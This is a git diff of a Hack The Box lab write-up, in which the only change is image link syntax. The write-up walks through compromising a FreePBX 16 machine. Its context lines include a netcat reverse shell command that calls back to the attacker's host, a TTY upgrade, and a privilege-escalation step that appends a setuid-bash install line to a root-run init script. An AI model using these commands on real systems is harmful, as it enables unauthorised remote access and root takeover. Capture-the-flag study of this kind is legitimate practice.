@@ -45,11 +45,11 @@ Step 4: I noticed that the website contains a login which knowing HTB could be u
 
 The website has a bunch of interesting options as you can see: 
 
-![[Pasted image 20261014222027.png]]
+![](Pics/Pasted%20image%2020261014222027.png)
 
 
 From this point on I struggled a fuck ton . So I just started looking around until I encountered the version of the software (chill out on me I'am still getting used to doing this stuff...): 
-![[Pasted image 20261018205544.png]]
+![](Pics/Pasted%20image%2020261018205544.png)
 
 
 Step 5: This gave me the idea to search for "FreePBX 16.0.x.x Exploits", in which I successfully encountered a two important CVEs. 
@@ -63,7 +63,7 @@ I managed to get my hands on a exploit linked by the NIST website (https://githu
 
 After starting up the tool and using it based on the page's argument manual, I managed to get a URL *(it is given in the "VULNERABLE"  section)*:
 
-![[Pasted image 20261018211237.png]]
+![](Pics/Pasted%20image%2020261018211237.png)
 
 
 From my understanding is location where I can input regular terminal syntax with the only difference of it being on a website: 
@@ -71,7 +71,7 @@ From my understanding is location where I can input regular terminal syntax with
 
 *Yk what ?  from this point on this is going to be more like a blog than a walk through cuz I don't know how to label steps from this point on as it is all over the place (I will improvise in the future, trust.)*
 
-![[Pasted image 20261018211023.png]]
+![](Pics/Pasted%20image%2020261018211023.png)
 
 As you can see, I just typed "echo" as if the regular terminal meaning I'am successfully able to execute code remotely. 
 
@@ -85,7 +85,7 @@ nc -c sh {Local IP_addr} {Local_port}
 ```
 
 
-![[Pasted image 20261018211919.png]]
+![](Pics/Pasted%20image%2020261018211919.png)
 
 
 Then, I upgraded the TTY to a better one with a command I searched online.
@@ -98,7 +98,7 @@ script -qc /bin/bash /dev/null
 ```
 
 
-![[Pasted image 20261018212107.png]]
+![](Pics/Pasted%20image%2020261018212107.png)
 
 
 
@@ -114,12 +114,12 @@ find / "user.txt" 2>/dev/null
 
 Idk what happened but my shit started spitting out paths violently:
 
-![[Pasted image 20261018212732.png]]
+![](Pics/Pasted%20image%2020261018212732.png)
 
 
 So I just stuck to the method of manually going to the home directory and found the user flag...
 
-![[Pasted image 20261018214636.png]]
+![](Pics/Pasted%20image%2020261018214636.png)
 (can't show the flag cuz of the policy)
 
 
@@ -129,11 +129,11 @@ So I just stuck to the method of manually going to the home directory and found 
 
 # Getting root access....
 
-![[Pasted image 20261018213549.png]]
+![](Pics/Pasted%20image%2020261018213549.png)
 
 First thing that came to my mind was checking crontab jobs as I remembered it being mentioned on some of the websites about FreePBX vulnerably:
 
-![[Pasted image 20261018214159.png]]
+![](Pics/Pasted%20image%2020261018214159.png)
 
 Not too surprisingly, there were a bunch of cron jobs assigned that I could take a look at and hopefully exploit it...
 
@@ -165,7 +165,7 @@ var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahd
 
 when looking at the `sysadmin_dahdi_restart` script, you can see the following:
 
-![[Pasted image 20261101145344.png]]
+![](Pics/Pasted%20image%2020261101145344.png)
 
 The interesting part in this picture is the script executed with restart.
 
@@ -181,7 +181,7 @@ printf '\n install -m 4755 /bin/bash /home/asterisk/pwn1 \n' >> /etc/dahdi/init.
 touch /var/spool/asterisk/sysadmin/dahdi_restart
 ```
 
-![[Pasted image 20261101164444.png]]
+![](Pics/Pasted%20image%2020261101164444.png)
 
 
 
